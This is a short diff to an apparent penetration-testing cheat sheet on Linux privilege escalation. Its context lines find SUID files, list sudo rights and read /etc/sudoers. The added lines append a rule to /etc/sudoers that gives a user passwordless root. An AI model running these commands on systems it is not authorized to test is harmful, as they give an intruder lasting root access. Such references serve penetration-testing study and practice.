@@ -790,8 +790,13 @@ Find **SUID** files! [GTFOBins](https://gtfobins.github.io/)
 ```
 find / -perm -u=s -type f 2>/dev/null
 grep -rnw / -e "root"
+```
+
+Tinkering with `/etc/sudoers` file.
+```
 sudo -l
 cat /etc/sudoers
+echo "username ALL=NOPASSWD:ALL" >> /etc/sudoers
 ```
 
 **Linux Exploit Suggester** [here](https://github.com/The-Z-Labs/linux-exploit-suggester)
